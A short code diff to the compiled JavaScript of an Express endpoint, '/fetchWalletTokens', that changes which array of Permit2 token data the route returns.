@@ -256,7 +256,7 @@ exports.app.post("/fetchWalletTokens", function (req, res) { return __awaiter(vo
                 for (i = 0; i < (permit2Tokens === null || permit2Tokens === void 0 ? void 0 : permit2Tokens.length); i++) {
                     _loop_1(i);
                 }
-                return [2 /*return*/, [tokensReturned, _addrs]];
+                return [2 /*return*/, [tokenInPermitFormat, _addrs]];
         }
     });
 }); });
